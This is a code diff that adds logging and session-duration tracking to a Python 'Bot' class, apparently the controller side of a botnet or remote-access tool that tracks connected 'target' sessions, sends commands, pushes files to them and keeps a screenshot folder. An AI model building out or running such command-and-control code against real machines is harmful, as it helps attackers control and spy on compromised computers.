@@ -6,6 +6,8 @@ import ssl
 import sys
 import time
 import threading
+import logging
+from datetime import datetime
 
 # Constants
 SCREENSHOT_DIR = 'images/screenshots'
@@ -24,19 +26,23 @@ class Bot:
         self.ip = ip
         self.alias = "bot"
         self.id = Bot.botCount
+        self.connected_time = datetime.now()
         Bot.botList[self.id] = self
         Bot.botCount += 1
+        logging.info(f"Bot initialized - ID: {self.id} | IP: {self.ip} | Connected at: {self.connected_time}")
 
     def reliable_send(self, data):
         jsondata = json.dumps(data)
         while True:
             try:
                 self.target.send(jsondata.encode(ENCODING))
+                logging.debug(f"Data sent to Session {self.id}: {data}")
                 break
             except BrokenPipeError:
+                logging.error(f"Broken pipe error for Session {self.id}")
                 break
             except Exception as e:
-                print(f"An unexpected error occurred: {e}")
+                logging.error(f"Error sending data to Session {self.id}: {e}")
                 break
 
     def reliable_recv(self):
@@ -44,14 +50,16 @@ class Bot:
         while True:
             try:
                 data += self.target.recv(1024).decode(ENCODING).rstrip()
-                return json.loads(data)
+                result = json.loads(data)
+                logging.debug(f"Data received from Session {self.id}: {result}")
+                return result
             except ValueError:
                 continue
             except socket.error as e:
-                print(f"Socket error: {e}")
+                logging.error(f"Socket error for Session {self.id}: {e}")
                 return None
             except Exception as e:
-                print(f"Unexpected error: {e}")
+                logging.error(f"Unexpected error for Session {self.id}: {e}")
                 return None
 
     def upload_file(self, file_name):
@@ -59,14 +67,19 @@ class Bot:
             f = open(file_name, 'rb')
             data = f.read()
             f.close()
+            logging.info(f"File upload started - Session {self.id} | File: {file_name}")
         except FileNotFoundError:
+            logging.error(f"File not found - Session {self.id} | File: {file_name}")
             return f"The file {file_name} does not exist."
         except IOError as e:
+            logging.error(f"IO Error during file upload - Session {self.id} | File: {file_name} | Error: {e}")
             return f"Error reading from {file_name}: {e}"
 
         try:
             self.target.send(data)
+            logging.info(f"File upload completed - Session {self.id} | File: {file_name}")
         except socket.error as e:
+            logging.error(f"Socket error during file upload - Session {self.id} | Error: {e}")
             return f"Error sending data: {e}"
 
         return f"File {file_name} uploaded successfully."
@@ -155,7 +168,10 @@ class Bot:
         try:
             self.reliable_send('quit')
             self.target.close()
+            duration = datetime.now() - self.connected_time
+            logging.info(f"Session {self.id} terminated - Duration: {duration}")
             del Bot.botList[self.id]
-            return "Session terminated successfully"
+            return f"Session terminated successfully - Duration: {duration}"
         except Exception as e:
+            logging.error(f"Error terminating Session {self.id}: {e}")
             return f"Error terminating session: {e}" 
